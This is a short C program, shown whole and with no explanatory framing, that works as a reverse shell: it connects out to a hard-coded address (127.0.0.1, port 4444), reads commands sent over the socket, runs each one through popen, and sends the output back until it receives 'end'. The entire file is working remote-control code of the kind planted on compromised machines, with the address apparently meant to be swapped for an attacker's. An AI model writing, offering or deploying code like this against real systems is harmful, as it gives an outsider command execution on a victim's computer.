#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

int main(int argc, char *argv[])
{
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    char host[16] = "127.0.0.1";
    portno = 4444;
    char buffer[512];
    char buffer_one[8] = ";;;\n";
    FILE *in;
    extern FILE *popen();

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        exit(0);
    server = gethostbyname(host);
    if (server == NULL) {
        exit(0);
    }
    memset((char *) &serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    memmove((char *)&serv_addr.sin_addr.s_addr,(char *)server->h_addr, server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        exit(0);
    
    // Send "Connection established"
    n = write(sockfd,buffer_one,strlen(buffer_one));
    if (n < 0)
        exit(0);
    while(1) {
       // Clear buffer and read in command
        memset(buffer,0,512);
        n = read(sockfd,buffer,511);
        if (n < 0)
            exit(0);
        
        // if command is "end" break out of loop to end program
        if(strstr(buffer, "end") != NULL)
            break;
        
        // Execute command
        if(!(in = popen(buffer,"r"))){
            exit(1);
        }
        
        // Clear buffer and send command output to host
        memset(buffer,0,512);
        while(fgets(buffer, sizeof(buffer), in)!=NULL){
            n = write(sockfd,buffer,strlen(buffer));
            if (n < 0)
                exit(0);
            memset(buffer,0,512);
        }
        n = write(sockfd,buffer_one, strlen(buffer_one));
        if (n < 0)
            exit(0);
        pclose(in);

        n = 0;
    }
    close(sockfd);
    return 0;
}
